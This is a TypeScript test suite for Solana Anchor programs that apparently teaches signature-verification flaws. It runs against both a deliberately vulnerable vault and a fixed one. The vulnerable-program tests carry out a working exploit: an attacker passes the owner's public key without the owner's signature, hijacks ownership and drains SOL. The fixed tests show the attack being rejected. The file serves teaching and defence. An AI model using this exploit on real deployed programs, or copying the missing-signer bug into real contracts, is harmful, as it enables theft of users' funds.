import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { assert } from "chai";
import { Keypair, PublicKey, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { SignatureVulnerable } from "../target/types/signature_vulnerable";
import { SignatureFixed } from "../target/types/signature_fixed";

/**
 * Signature Verification Vulnerability Test Suite
 * 
 * This test demonstrates how missing signer checks allow attackers to
 * impersonate account owners without having their private keys.
 * 
 * Key Concepts:
 * - Address verification: Checking if pubkey_a == pubkey_b
 * - Signature verification: Checking if the account actually SIGNED
 * - The vulnerability: Checking address without verifying signature
 */
describe("08 - Signature Verification Vulnerabilities", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const programVuln = anchor.workspace.SignatureVulnerable as Program<SignatureVulnerable>;
  const programFixed = anchor.workspace.SignatureFixed as Program<SignatureFixed>;

  // The legitimate vault owner
  const owner = Keypair.generate();
  // The attacker trying to steal funds
  const attacker = Keypair.generate();

  // Vault PDAs
  const [vaultVuln] = PublicKey.findProgramAddressSync(
    [Buffer.from("vault"), owner.publicKey.toBuffer()],
    programVuln.programId
  );
  
  const [vaultFixed] = PublicKey.findProgramAddressSync(
    [Buffer.from("vault"), owner.publicKey.toBuffer()],
    programFixed.programId
  );

  describe("Setup", () => {
    before(async () => {
      // Fund accounts
      const airdropOwner = await provider.connection.requestAirdrop(
        owner.publicKey, 
        10 * LAMPORTS_PER_SOL
      );
      await provider.connection.confirmTransaction(airdropOwner);
      
      const airdropAttacker = await provider.connection.requestAirdrop(
        attacker.publicKey, 
        10 * LAMPORTS_PER_SOL
      );
      await provider.connection.confirmTransaction(airdropAttacker);
    });

    it("should initialize vulnerable vault with owner and deposit funds", async () => {
      await programVuln.methods.initialize()
        .accounts({
          vault: vaultVuln,
          signer: owner.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([owner])
        .rpc();
        
      // Deposit SOL to track balance properly
      await programVuln.methods.deposit(new anchor.BN(2 * LAMPORTS_PER_SOL))
        .accounts({
          vault: vaultVuln,
          depositor: owner.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([owner])
        .rpc();

      const vaultData = await programVuln.account.vault.fetch(vaultVuln);
      assert.equal(vaultData.owner.toString(), owner.publicKey.toString());
      assert.equal(vaultData.balance.toNumber(), 2 * LAMPORTS_PER_SOL);
      
      console.log("\n  Vulnerable Vault Created:");
      console.log("    - Vault:", vaultVuln.toString().slice(0, 16) + "...");
      console.log("    - Owner:", owner.publicKey.toString().slice(0, 16) + "...");
      console.log("    - Balance: 2 SOL");
    });

    it("should initialize fixed vault with owner", async () => {
      await programFixed.methods.initialize()
        .accounts({
          vault: vaultFixed,
          signer: owner.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([owner])
        .rpc();
        
      // Deposit SOL
      await programFixed.methods.deposit(new anchor.BN(2 * LAMPORTS_PER_SOL))
        .accounts({
          vault: vaultFixed,
          depositor: owner.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([owner])
        .rpc();

      console.log("\n  Fixed Vault Created:");
      console.log("    - Vault:", vaultFixed.toString().slice(0, 16) + "...");
      console.log("    - Owner:", owner.publicKey.toString().slice(0, 16) + "...");
    });
  });

  describe("Vulnerability: Missing Signer Check Exploit", () => {
    it("should allow attacker to hijack ownership without owner signature", async () => {
      // The attacker knows the owner's public key (it's public data on-chain)
      // The attacker passes the owner's pubkey as the "authority" account
      // BUT the owner never signs the transaction!
      
      console.log("\n  EXPLOIT STEP 1: Hijack Ownership");
      console.log("    - Attacker passes owner's pubkey as authority");
      console.log("    - Program only checks: vault.owner == authority.key()");
      console.log("    - Program DOES NOT check: authority.is_signer == true");
      
      // This should succeed even though owner never signed!
      await programVuln.methods.updateOwner(attacker.publicKey)
        .accounts({
          vault: vaultVuln,
          authority: owner.publicKey, // Correct address, but NOT signing!
        })
        // Note: We don't include owner in signers - only payer (wallet) pays gas
        .rpc();
        
      const vaultData = await programVuln.account.vault.fetch(vaultVuln);
      assert.equal(
        vaultData.owner.toString(), 
        attacker.publicKey.toString(),
        "Ownership should be hijacked"
      );
      
      console.log("    - SUCCESS: Ownership transferred to attacker!");
    });

    it("should allow attacker to withdraw funds after hijacking", async () => {
      console.log("\n  EXPLOIT STEP 2: Drain Funds");
      
      const balanceBefore = await provider.connection.getBalance(vaultVuln);
      const stealAmount = new anchor.BN(1 * LAMPORTS_PER_SOL);
      
      // Now attacker IS the owner, so this should work
      // Note: attacker needs to sign since they are now the owner
      await programVuln.methods.withdraw(stealAmount)
        .accounts({
          vault: vaultVuln,
          authority: attacker.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .rpc();
        
      const balanceAfter = await provider.connection.getBalance(vaultVuln);
      assert.isTrue(
        balanceAfter < balanceBefore,
        "Funds should be drained"
      );
      
      console.log("    - Vault balance before:", balanceBefore / LAMPORTS_PER_SOL, "SOL");
      console.log("    - Vault balance after:", balanceAfter / LAMPORTS_PER_SOL, "SOL");
      console.log("    - EXPLOIT COMPLETE: Attacker stole 1 SOL");
    });
  });

  describe("Fix: Signer Type Enforcement", () => {
    it("should reject update_owner without owner signature", async () => {
      console.log("\n  SECURE: Attempting same attack on fixed program...");
      
      try {
        await programFixed.methods.updateOwner(attacker.publicKey)
          .accounts({
            vault: vaultFixed,
            authority: owner.publicKey,
          })
          .signers([attacker]) // Attacker signs to pay gas, but owner doesn't sign
          .rpc();
          
        assert.fail("Should have rejected - missing owner signature");
      } catch (err: any) {
        // The error could be in different formats
        const errMessage = err.message || "";
        const errStr = JSON.stringify(err);
        const isSignatureError = 
          errMessage.includes("unknown signer") ||
          errStr.includes("Signature verification failed") ||
          errStr.includes("ConstraintSigner") ||
          errStr.includes("Error processing");
          
        assert.isTrue(isSignatureError, `Unexpected error type: ${errMessage}`);
        
        console.log("    - Transaction REJECTED");
        console.log("    - Reason: Missing required signature from owner");
        console.log("    - Signer<'info> type enforces signature verification");
      }
    });

    it("should reject withdraw without owner signature", async () => {
      try {
        await programFixed.methods.withdraw(new anchor.BN(LAMPORTS_PER_SOL))
          .accounts({
            vault: vaultFixed,
            authority: owner.publicKey,
            systemProgram: SystemProgram.programId,
          })
          .signers([attacker])
          .rpc();
          
        assert.fail("Should have rejected - missing owner signature");
      } catch (err: any) {
        const errMessage = err.message || "";
        const errStr = JSON.stringify(err);
        const isSignatureError = 
          errMessage.includes("unknown signer") ||
          errStr.includes("Signature verification failed") ||
          errStr.includes("ConstraintSigner") ||
          errStr.includes("Error processing");
          
        assert.isTrue(isSignatureError, `Unexpected error: ${errMessage}`);
        console.log("    - Withdraw also REJECTED without owner signature");
      }
    });

    it("should allow legitimate owner operations with signature", async () => {
      // When owner actually signs, it should work
      const newOwner = Keypair.generate();
      
      await programFixed.methods.updateOwner(newOwner.publicKey)
        .accounts({
          vault: vaultFixed,
          authority: owner.publicKey,
        })
        .signers([owner]) // Owner actually signs!
        .rpc();
        
      const vaultData = await programFixed.account.vault.fetch(vaultFixed);
      assert.equal(vaultData.owner.toString(), newOwner.publicKey.toString());
      
      console.log("\n  LEGITIMATE OPERATION:");
      console.log("    - Owner properly signed the transaction");
      console.log("    - Ownership transferred successfully");
    });
  });
});
